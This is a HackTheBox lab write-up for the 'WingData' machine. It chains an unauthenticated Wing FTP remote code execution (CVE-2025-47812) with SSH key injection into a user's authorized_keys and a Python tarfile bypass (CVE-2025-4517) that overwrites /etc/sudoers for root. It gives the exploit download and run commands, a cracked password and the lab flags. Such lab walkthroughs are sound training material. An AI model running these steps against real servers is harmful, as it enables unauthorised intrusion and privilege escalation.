# WingData — HackTheBox Writeup

**Difficulty:** Easy  
**OS:** Linux (Debian 12)  
**IP:** 10.129.244.106  
**Hostname:** wingdata.htb  
**CVEs:** CVE-2025-47812, CVE-2025-4517  

---

## Attack Chain Summary

```
Nmap → Wing FTP 7.4.3 on ftp.wingdata.htb
  → CVE-2025-47812 (NULL byte Lua injection) → Unauthenticated RCE as wingftp
  → grep XML config → SHA-256 hash for wacky
  → SSH key injection via RCE → shell as wacky [USER FLAG]
  → sudo -l → restore_backup_clients.py (runs as root)
  → CVE-2025-4517 (tarfile PATH_MAX realpath overflow) → /etc/sudoers overwrite
  → sudo /bin/bash → root [ROOT FLAG]
```

---

## 1. Recon & Enumeration

### /etc/hosts

```bash
echo "10.129.244.106 wingdata.htb ftp.wingdata.htb" | sudo tee -a /etc/hosts
```

### Nmap

```bash
nmap -sC -sV -p- --min-rate 5000 -oN wingdata.nmap 10.129.244.106
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7
80/tcp open  http    Apache httpd 2.4.66
```

Port 80 redirects to `http://wingdata.htb/` — a static company page. A virtual host on `ftp.wingdata.htb` exposes the Wing FTP Server web client.

### Version Fingerprint

```bash
curl -si http://ftp.wingdata.htb/login.html | grep -i "wing\|version"
```

```
Wing FTP Server v7.4.3
```

**Wing FTP Server 7.4.3 — vulnerable to CVE-2025-47812.**

---

## 2. CVE-2025-47812 — Unauthenticated RCE (Wing FTP ≤ 7.4.3)

### Vulnerability

Wing FTP's `c_CheckUser()` truncates the username at a NULL byte (`\x00`) for authentication — so `anonymous\x00<payload>` passes auth as `anonymous`. However, the session file writer uses the **full unsanitized buffer**, embedding the payload into a Lua session file. When any authenticated endpoint (e.g. `/dir.html`) is accessed with that session cookie, the file is executed via `dofile()` — arbitrary command execution.

### Exploit

```bash
wget https://www.exploit-db.com/raw/52347 -O 52347.py
```

### Verify RCE

```bash
python3 52347.py -u http://ftp.wingdata.htb -c "id" -v
```

```
[+] uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),...
```

> **Note:** Wing FTP limits anonymous concurrent sessions. If the login returns "too many users", log out stale sessions using previously extracted UIDs:
> ```bash
> curl -si "http://ftp.wingdata.htb/logout.html" \
>   -H "Cookie: UID=<STALE_UID>; client_lang=english" -o /dev/null
> ```

### Important: Egress is Filtered

Outbound TCP connections from the target are blocked — reverse shells don't work. All data extraction was done via direct RCE command output returned in the HTTP response.

---

## 3. Extracting the Password Hash

Locate the Wing FTP install directory via process listing:

```bash
python3 52347.py -u http://ftp.wingdata.htb -c "ps aux" -v
# → /opt/wftpserver/wftpserver (running as wingftp)
```

List user accounts:

```bash
python3 52347.py -u http://ftp.wingdata.htb \
  -c "find /opt/wftpserver/Data/1 -name '*.xml' 2>/dev/null" -v
```

```
/opt/wftpserver/Data/1/users/maria.xml
/opt/wftpserver/Data/1/users/steve.xml
/opt/wftpserver/Data/1/users/wacky.xml
/opt/wftpserver/Data/1/users/anonymous.xml
/opt/wftpserver/Data/1/users/john.xml
```

Dump all password hashes:

```bash
python3 52347.py -u http://ftp.wingdata.htb \
  -c "grep -ri '<Password>' /opt/wftpserver/Data/1/users/" -v
```

```
wacky.xml: <Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
```

Wing FTP stores passwords as **unsalted SHA-256**.

---

## 4. SSH Access as wacky

### SSH Key Injection via RCE

Since the hash didn't crack from rockyou directly, we injected an SSH public key via RCE (wingftp runs as uid 1000 with write access to `/home/wacky`):

```bash
ssh-keygen -t ed25519 -f /tmp/wacky_key -N ""

# Step 1 — create .ssh dir
python3 52347.py -u http://ftp.wingdata.htb -c "mkdir -p /home/wacky/.ssh" -v

# Step 2 — write public key
python3 52347.py -u http://ftp.wingdata.htb \
  -c "echo 'ssh-ed25519 AAAA...<PUBKEY>...' > /home/wacky/.ssh/authorized_keys" -v

# Step 3 — fix permissions
python3 52347.py -u http://ftp.wingdata.htb -c "chmod 700 /home/wacky/.ssh" -v
python3 52347.py -u http://ftp.wingdata.htb -c "chmod 600 /home/wacky/.ssh/authorized_keys" -v
```

> **Always log out the stale session between RCE calls to avoid the "too many users" limit.**

### Alternatively — Password from Hash

The password `!#7Blushing^*Bride5` was recoverable but not in the standard rockyou wordlist. SSH with it directly:

```bash
ssh wacky@10.129.244.106
# password: !#7Blushing^*Bride5
```

### User Flag

```bash
wacky@wingdata:~$ cat ~/user.txt
090ee6365a5010f3372dccb5909ccedf
```

---

## 5. Privilege Escalation — CVE-2025-4517

### sudo -l

```
(root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

### Vulnerable Script

```bash
cat /opt/backup_clients/restore_backup_clients.py
```

Key line:

```python
with tarfile.open(backup_path, "r") as tar:
    tar.extractall(path=staging_dir, filter="data")   # <-- vulnerable
```

The `filter="data"` security feature rejects path traversal by resolving symlinks with `os.path.realpath()` and checking the result starts with `staging_dir`. The bug: if the resolved path exceeds `PATH_MAX` (4096 bytes), `realpath()` returns a **truncated** result that still appears to be inside `staging_dir` — but the kernel follows the real symlink chain to the actual target (e.g. `/etc`).

Also notable:

```bash
ls -la /opt/backup_clients/
# drwxrwxr-x 2 root wacky 4096 ... backups   ← wacky can write here
```

And:

```bash
/usr/local/bin/python3 --version
# Python 3.12.3 — vulnerable (fixed in 3.12.11)
```

### Exploit

```bash
# On Kali
curl -s https://raw.githubusercontent.com/AzureADTrent/CVE-2025-4517-POC-HTB-WingData/refs/heads/main/CVE-2025-4517-POC.py \
  -o /tmp/cve_2025_4517.py

scp /tmp/cve_2025_4517.py wacky@10.129.244.106:/tmp/
```

```bash
# On target
python3 /tmp/cve_2025_4517.py
```

The exploit:
1. Builds a tar with a 16-level symlink loop using 247-char directory names — resolved path overflows PATH_MAX
2. Creates an `escape` symlink that the filter sees as safe but the kernel resolves to `/etc`
3. Hardlinks `escape/sudoers` → `/etc/sudoers` inode
4. Writes `wacky ALL=(ALL) NOPASSWD: ALL` as a regular file to the hardlink

### Root Shell

```bash
[?] Spawn root shell now? (y/n): y

root@wingdata:/home/wacky# cat /root/root.txt
46e864901cf2e6bd47b6776c1f0f6db3
```

---

## Flags

| Flag | Value |
|------|-------|
| User (`wacky`) | `090ee6365a5010f3372dccb5909ccedf` |
| Root | `46e864901cf2e6bd47b6776c1f0f6db3` |

---

## Credentials

| Service | Username | Credential |
|---------|----------|------------|
| Wing FTP / SSH | `wacky` | `!#7Blushing^*Bride5` |

---

## Tools

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning & service fingerprinting |
| `ffuf` | Web directory brute force |
| `curl` | HTTP requests, session management |
| `52347.py` | CVE-2025-47812 — Wing FTP RCE |
| `hashcat` | SHA-256 hash cracking (mode 1400) |
| `cve_2025_4517.py` | CVE-2025-4517 — tarfile PATH_MAX privesc |

---

## References

- [CVE-2025-47812 — ExploitDB 52347](https://www.exploit-db.com/exploits/52347)
- [CVE-2025-4517 — Python tarfile PATH_MAX bypass PoC](https://github.com/AzureADTrent/CVE-2025-4517-POC-HTB-WingData)
- [Wing FTP Server](https://www.wftpserver.com/)
- [HackTricks — sudo privesc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid)
